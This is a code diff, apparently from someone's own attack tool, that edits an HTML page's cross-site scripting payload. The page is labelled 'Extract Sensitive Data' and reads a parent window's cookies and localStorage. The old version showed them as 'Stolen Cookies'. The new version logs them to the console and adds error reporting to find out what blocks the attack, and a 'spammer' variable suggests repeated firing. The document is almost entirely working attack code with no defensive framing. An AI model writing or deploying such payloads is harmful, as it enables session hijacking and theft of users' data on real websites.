@@ -13,22 +13,26 @@
     <button onclick="startAttack()">Extract Sensitive Data</button>
 
     <script>
-        // Payload الاستطلاع: بيسحب الكوكيز واللوكال ستوريدج ويعرضهم في الصفحة الرئيسية
+// Payload الاستكشاف وكشف الأخطاء
         let payload = `
+            console.log('🔥 --- XSS EXECUTION STARTED --- 🔥');
             try {
-                let cookies = window.top.document.cookie;
-                let ls = JSON.stringify(window.top.localStorage);
+                console.log('[+] Current Domain: ', document.domain);
                 
-                let attackHtml = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#1a202c;z-index:999999;color:#48bb78;font-family:monospace;padding:20px;overflow:auto;">';
-                attackHtml += '<h1>[+] FATO RECON SUCCESSFUL</h1>';
-                attackHtml += '<h3>[!] Stolen Cookies:</h3><textarea style="width:100%;height:100px;">' + cookies + '</textarea>';
-                attackHtml += '<h3>[!] Stolen LocalStorage:</h3><textarea style="width:100%;height:300px;">' + ls + '</textarea>';
-                attackHtml += '</div>';
-
-                window.top.document.body.innerHTML = attackHtml;
-            } catch(e) {}
+                // محاولة قراءة الكوكيز
+                console.log('[+] Cookies: ', window.top.document.cookie);
+                
+                // محاولة قراءة اللوكال ستوريدج
+                console.log('[+] LocalStorage: ', window.top.localStorage);
+                
+                alert('FATO RECON SUCCESSFUL!');
+            } catch(err) {
+                // لو حصل إيرور، اطبعهولي هنا عشان نعرف مين اللي مانعنا!
+                console.error('❌ XSS ERROR CAUGHT: ', err.name, err.message);
+            }
+            console.log('🔥 --- XSS EXECUTION ENDED --- 🔥');
             // get_ext
-        `.replace(/\n/g, ''); 
+        `.replace(/\n/g, ' ');
 
         let spammer;
 
